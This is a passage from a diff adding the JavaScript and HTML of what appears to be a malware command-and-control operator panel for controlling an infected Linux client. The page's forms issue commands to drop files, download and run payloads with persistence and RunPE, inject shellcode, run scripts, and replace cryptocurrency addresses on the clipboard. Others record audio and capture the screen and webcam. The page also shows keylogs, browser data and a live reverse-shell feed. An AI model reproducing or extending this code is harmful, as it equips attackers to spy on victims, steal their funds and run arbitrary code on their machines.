+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#dropfiles").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var file = $("#dropfile").val();
+        var zone = $("#dropZone").val();
+        var name = $("#droplocation").val();
+        var date = $("#creationdate").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xDROP" + "&real=Drop File" + "&para=" + file + "|" + zone + "|" + name + "|" + date + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#issueDownloadnRun").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var file = $("#file").val();
+        var startupmethod = $("#startupmethod").val();
+        var host = $("#hostpath").val();
+
+        var startup;
+        if ($("#startup").is(":checked")) {
+            startup = "true";
+        } else {
+            startup = "false";
+        }
+
+        var runpe;
+        if ($("#runpe").is(":checked")) {
+            runpe = "true";
+        } else {
+            runpe = "false";
+        }
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            //  data: "cmd=0xDR" + "&real=Download and Run" + "&para=" + file + "|" + startupmethod + "|" + host + "&hidden=false&runpe=" + runpe + "&startup=" + startup + "&to={{.ClientUID}}",
+            data: "cmd=0xDR" + "&real=Download and Run" + "&para=" + file + "|" + startup + "|" + startupmethod + "|" + runpe + "|" + host + "|" + "false" + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#seedTorrent").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var file = $("#torrentfile").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xSEED" + "&real=Seed Torrent" + "&para=" + file + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#issueClipper").submit(function (event) {
+        //console.log("Issue command called")
+        event.preventDefault();
+        var Bitcoin = $("#btcaddr").val();
+        var Monero = $("#xmraddr").val();
+        var Ethereum = $("#ethaddr").val();
+        var Custom = $("#customaddr").val();
+        var CustomReg = $("#customregex").val();
+
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xCLIP" + "&real=Clipper" + "&para=" + "clip" + "|" + Bitcoin + "|" + Monero + "|" + Ethereum + "|" + Custom + "|" + CustomReg + "&to={{.ClientUID}}",
+            success: function (text) {
+                console.log(text);
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    Swal.fire("Error", "Unknown Error: " + text, "error");
+                }
+            },
+        });
+    });
+
+    $("#note").submit(function (event) {
+        event.preventDefault();
+        console.log("note");
+        var message = $("#adminNotes").val();
+        $.ajax({
+            type: "POST",
+            url: "../save/client/notes",
+            data: "uid={{.ClientUID}}" + "&notes=" + message,
+            success: function (text) {
+                if (text == "success") {
+                    toastr.success("Saved!");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    toastr.error("Unable to save!");
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $("#scripting").submit(function (event) {
+        event.preventDefault();
+        var codedata = $("#code").val();
+        var encodedString = btoa(codedata);
+        var selectedScript = $("#selectScript").val();
+        var sel = document.getElementById("selectScript");
+        var selected = sel.options[sel.selectedIndex];
+        var code = selected.getAttribute("data-rn");
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=" + code + "&real=" + selectedScript + "&para=" + encodedString + "&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $("#shellcode").submit(function (event) {
+        event.preventDefault();
+        var codedata = $("#shelldata").val();
+        var process = $("#process").val();
+        var args = $("#args").val();
+        var selectedScript = $("#selectMethod").val();
+        var sel = document.getElementById("selectScript");
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xSHELL" + "&real=Shellcode" + "&para=" + selectedScript + "|" + process + "|" + args + "|" + codedata + "&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $("#record").submit(function (event) {
+        event.preventDefault();
+        var bitrateSelect = $("#bitrateSelect").val();
+        var timeSelect = $("#timeSelect").val();
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xREC" + "&real=Record Audio" + "&para=" + bitrateSelect + "|" + timeSelect + "&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $("#screenshot").submit(function (event) {
+        event.preventDefault();
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xIMG&real=Screenshot&para=screenshot&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $("#webcam").submit(function (event) {
+        event.preventDefault();
+        $.ajax({
+            type: "POST",
+            url: "../issue/linux",
+            data: "cmd=0xIMG&real=Webcam&para=webcam&to={{.ClientUID}}",
+            success: function (text) {
+                if (text == "success") {
+                    Swal.fire("Command Issued!", "Command was issued to the clients.", "success");
+                    setTimeout("location.reload(true);", 2000);
+                } else if (text == "error") {
+                    Swal.fire("Oops...", "Something went wrong but nothing was lost.", "error");
+                    setTimeout("location.reload(true);", 2000);
+                } else {
+                    toastr.warning("Unknown Error: " + text);
+                }
+            },
+        });
+    });
+
+    $(function () {
+        $("#fileTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                order: [[1, "desc"]],
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#fileTable_wrapper .col-md-6:eq(0)");
+
+        $("#RecordingsTable").DataTable({
+            responsive: true,
+            lengthChange: false,
+            autoWidth: false,
+            pagingType: "simple",
+            searching: false,
+        });
+
+        $("#taskTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#installedTable_wrapper .col-md-6:eq(0)");
+
+        $("#installedTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#installedTable_wrapper .col-md-6:eq(0)");
+        $("#processTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#installedTable_wrapper .col-md-6:eq(0)");
+        $("#browserTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#browserTable_wrapper .col-md-6:eq(0)");
+
+        $("#keylogsTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                order: [[0, "desc"]],
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#keylogsTable_wrapper .col-md-6:eq(0)");
+
+        $("#commandLogTable")
+            .DataTable({
+                responsive: true,
+                lengthChange: false,
+                autoWidth: false,
+                order: [[2, "desc"]],
+                columnDefs: [
+                    {
+                        targets: [0],
+                        visible: false,
+                        searchable: true,
+                    },
+                ],
+                select: {
+                    style: "single",
+                },
+                buttons: [
+                    {
+                        extend: "collection",
+                        text: '<i class="fas fa-file-download"> Export<\/i>',
+                        buttons: [
+                            {
+                                extend: "copyHtml5",
+                                text: '<i class="far fa-copy"> Copy<\/i>',
+                                titleAttr: "Copy",
+                            },
+                            {
+                                extend: "csvHtml5",
+                                text: '<i class="fa fa-table"> CVS<\/i>',
+                                titleAttr: "CVS",
+                            },
+                        ],
+                    },
+                ],
+            })
+            .buttons()
+            .container()
+            .appendTo("#commandLogTable_wrapper .col-md-6:eq(0)");
+    });
+
+    toastr.options = {
+        closeButton: true,
+        debug: false,
+        newestOnTop: true,
+        progressBar: true,
+        positionClass: "toast-top-right",
+        preventDuplicates: true,
+        onclick: null,
+        showDuration: "300",
+        hideDuration: "1000",
+        timeOut: "5000",
+        extendedTimeOut: "1000",
+        showEasing: "swing",
+        hideEasing: "linear",
+        showMethod: "fadeIn",
+        hideMethod: "fadeOut",
+    };
+    window.onload = function () {
+        let conn;
+        let last;
+
+        if (window["WebSocket"]) {
+            conn = new WebSocket("wss://" + document.location.host + "/live");
+            conn.onopen = function () {
+                console.log("Live Agent: Connected");
+                conn.send("ping");
+            };
+            conn.onclose = function (evt) {
+                console.log("Live Agent: Connection Closed (" + evt.code + ")");
+            };
+            conn.onmessage = function (evt) {
+                if (evt.data.length >= 1) {
+                    if(evt.data === "pong") {
+                        setTimeout(function(){
+                            conn.send("ping");
+                        }, 2000);
+                    }else{
+                        if (evt.data !== last) {
+                            last = evt.data;
+                            const words = evt.data.split("|");
+                            if (words[0] === "info") {
+                                toastr.info(words[1], words[2]);
+                            }
+                            if (words[0] === "success") {
+                                toastr.success(words[1], words[2]);
+                            }
+                            if (words[0] === "error") {
+                                toastr.error(words[1], words[2]);
+                            }
+                            if (words[0] === "rshell") {
+                                if (words[1] === "{{.ClientUID}}") {
+                                    let listGroup = $('.list-group');
+                                    listGroup.append("<li class='border-bottom'><pre><br>" + atob(words[2]) + "</pre></li>");
+                                    listGroup.animate({scrollTop: listGroup.prop("scrollHeight")}, 400);
+                                    //sendCommandInput.value = "";
+                                    defaultProgressBtn();
+                                }
+                            }
+                        }
+                    }
+                }
+            };
+        } else {
+            alert("Your browser does not support WebSockets. Do to this you will not get Live Notifications.");
+        }
+    };
+
+    function deleteSFile(ID) {
+        var name = ID.name;
+        Swal.fire({
+            title: "Delete this File?",
+            html: "<h3>Are you sure that you want to delete this File?",
+            showCancelButton: true,
+            confirmButtonText: `Delete`,
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: "../delete/file/windows",
+                    type: "POST",
+                    data: "id={{.ClientUID}}" + "&type=s" + "&name=" + name,
+                    dataType: "json",
+                });
+                Swal.fire("Deleted!", "The file was deleted.", "success");
+                setTimeout("location.reload(true);", 2000);
+            } else if (result.dismiss) {
+                Swal.fire("Canceled", "Nothing lost... Accept maybe some time.", "info");
+                setTimeout("location.reload(true);", 2000);
+            }
+        });
+    }
+    function deleteRFile(ID) {
+        var name = ID.name;
+        Swal.fire({
+            title: "Delete this File?",
+            html: "<h3>Are you sure that you want to delete this File?",
+            showCancelButton: true,
+            confirmButtonText: `Delete`,
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: "../delete/file/windows",
+                    type: "POST",
+                    data: "id={{.ClientUID}}" + "&type=r" + "&name=" + name,
+                    dataType: "json",
+                });
+                Swal.fire("Deleted!", "The file was deleted.", "success");
+                setTimeout("location.reload(true);", 2000);
+            } else if (result.dismiss) {
+                Swal.fire("Canceled", "Nothing lost... Accept maybe some time.", "info");
+                setTimeout("location.reload(true);", 2000);
+            }
+        });
+    }
+
+    function deleteLFile(ID) {
+        var name = ID.name;
+        Swal.fire({
+            title: "Delete this File?",
+            html: "<h3>Are you sure that you want to delete this File?",
+            showCancelButton: true,
+            confirmButtonText: `Delete`,
+        }).then((result) => {
+            if (result.isConfirmed) {
+                $.ajax({
+                    url: "../delete/file/windows",
+                    type: "POST",
+                    data: "id={{.ClientUID}}" + "&type=l" + "&name=" + name,
+                    dataType: "json",
+                });
+                Swal.fire("Deleted!", "The file was deleted.", "success");
+                setTimeout("location.reload(true);", 2000);
+            } else if (result.dismiss) {
+                Swal.fire("Canceled", "Nothing lost... Accept maybe some time.", "info");
+                setTimeout("location.reload(true);", 2000);
+            }
+        });
+    }
+</script>
+</body>
+</html>
